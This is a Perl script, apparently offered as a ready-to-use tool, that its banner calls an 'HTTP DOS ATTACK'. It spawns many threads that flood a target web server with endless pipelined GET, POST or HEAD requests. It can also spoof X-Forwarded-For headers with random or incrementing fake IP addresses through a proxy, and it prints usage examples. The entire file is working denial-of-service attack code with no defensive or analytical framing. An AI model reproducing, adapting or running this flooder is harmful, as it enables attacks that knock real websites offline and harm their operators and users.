#!/usr/bin/perl

#~> [-Version1] <~#

package control;

my $ip;

sub new {
    my ($class,$i) = @_;
    $ip = $i;
    my $self={};
    $ip = $i;
    bless $self, $class;
    return $self;
}

sub mas {
my ($self,$veces) = @_;
$veces = 1 if($veces eq "");
my ($a,$e,$o,$b) = split(/\./,$ip);
for($as=0;$as<$veces;$as++) {
$b++;
if($b>=255) {$b=0;$o++;}
if($o>=255) {$o=0;$e++;}
if($e>=255) {$e=0;$a++;}
die("[!] No mas IPs!\n") if($a>=255);
}
$ip = join "",$a,".",$e,".",$o,".",$b;
return $ip;
}

1;

package main;

use Socket;
use IO::Socket::INET;
use threads ('yield', 
	'exit' => 'threads_only',
	'stringify');
use threads::shared;
my $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36";
my $hilo;
my @vals = ('a','b','c','d','e','f','g','h','i','j','k','l','n','o','p','q','r','s','t','u','w','x','y','z',0,1,2,3,4,5,6,7,8,9);
my $randsemilla = "";
for($i = 0; $i < 30; $i++) {
    $randsemilla .= $vals[int(rand($#vals))];
}
sub socker {
    my ($remote,$port) = @_;
    my ($iaddr, $paddr, $proto);
    $iaddr = inet_aton($remote) || return false;
    $paddr = sockaddr_in($port, $iaddr) || return false;
    $proto = getprotobyname('tcp');
    socket(SOCK, PF_INET, SOCK_STREAM, $proto);
    connect(SOCK, $paddr) || return false;
    return SOCK;
}

sub sender {
    my ($connection,$puerto,$host,$file) = @_;
    my $sock;
	my $string;
for (0..7) { $string .= chr( int(rand(25) + 65) ); }

    while(true) {
        my $paquete = "";
        $sock = IO::Socket::INET->new(PeerAddr => $host, PeerPort => $puerto, Proto => 'tcp');
        unless($sock) {
            print "[+] Requests From @ $ipinicial\n";
            sleep(1);
            next;
        }
        for($i=0;$i<$threads_connection;$i++) {
            $ipinicial = $sumador->mas();
            my $filepath = $file;
            $filepath =~ s/(\{mn\-fakeip\})/$ipinicial/g;
			$paquete .= join "" ,$method, " ",$filepath, " HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\nX-Forwarded-For: ",int(rand(255)+1),".",int(rand(255)+1),".",int(rand(255)+1),".",int(rand(255)+1),"\r\n\r\n";
        }
        $paquete =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        print $sock $paquete;
    }
}

sub sender2 {
    my ($puerto,$host,$paquete) = @_;
    my $sock;
    my $sumador :shared;
    while(true) {
        $sock = &socker($host,$puerto);
        unless($sock) {
            print "\n[X] Unable to connect...\n\n";
            next;
        }
        print $sock $paquete;
    }
}

sub comenzar {
    $SIG{'KILL'} = sub { print "[!] Killed...\n"; threads->exit(); };
	# httpdos.pl http://target.com 99999999 1000 80.187.140.26:8080 
    $url = $ARGV[0];                # URL
    $connection = $ARGV[1];         # Connection
    $threads_connection = $ARGV[2]; # Threads
	$method = $ARGV[3];             # Method
    $ipfake = $ARGV[4];             # Proxy
    if($threads_connection < 1) {
        print "[-] Invalid [url] [connection] [threads] [proxy]\n";
        exit;
    }
    if($url !~ /^http:\/\//) {
        $url .= "/" if($url =~ /^https?:\/\/([\d\w\:\.-]*)$/);;
		($host,$file) = ($url =~ /^https?:\/\/(.*?)\/(.*)/);
    } else {
		$url .= "/" if($url =~ /^http?:\/\/([\d\w\:\.-]*)$/);
		($host,$file) = ($url =~ /^http?:\/\/(.*?)\/(.*)/);
	}
	$puerto = 80;
    ($host,$puerto) = ($host =~ /(.*?):(.*)/) if($host =~ /(.*?):(.*)/);
    $file =~ s/\s/ /g;
    $file = "/".$file if($file !~ /^\//);
    print join "","[+] Target     : ",$host,":",$puerto,"\n";
	print join "","[+] Path       : ",$method," ",$file,"\n";
	print join "","[+] Proxy      : ",$ipfake,"\n";
	print join "","[+] Connection : ",$connection,"\n";
	print join "","[+] Threads    : ",$threads_connection,"\n\n";
    if($ipfake eq "") {
        my $paquetebase = join "",$method," ",$file," HTTP/1.1\r\nHost: ",$host,"\r\nUser-Agent: ",$ua,"\r\nIf-None-Match: ",$randsemilla,"\r\nAccept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip,deflate\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nContent-Length: 0\r\nConnection: Keep-Alive\r\n\r\n";
        $paquetesender = "";
        $paquetesender = $paquetebase x $threads_connection;
        $paquetesender =~ s/Connection: Keep-Alive\r\n\r\n$/Connection: Close\r\n\r\n/;
        for($v=0;$v<$connection;$v++) {
            $thr[$v] = threads->create('sender2', ($puerto,$host,$paquetesender));
        }
    } else {
        $sumador = control->new($ipfake);
        for($v=0;$v<$connection;$v++) {
            $thr[$v] = threads->create('sender', ($threads_connection,$puerto,$host,$file));
        }
    }
    print "[!] Loading...\n";
    for($v=0;$v<$connection;$v++) {
        if ($thr[$v]->is_running()) {
            sleep(3);
            $v--;
        }
    }
    print "[!] Finished !\n";
}

if($#ARGV > 3) {
    comenzar();
} else {
    print("
[+]---------------------------------------------------------------[+]
                   H T T P - D O S - A T T A C K                   
[+]---------------------------------------------------------------[+]
--> Use: httpdos.pl [Url] [Connection] [Threads] [GET/POST/HEAD] [Proxy]
--> Ex : httpdos.pl http://target.com 1500 800 GET 178.62.193.19:8080\n");
}
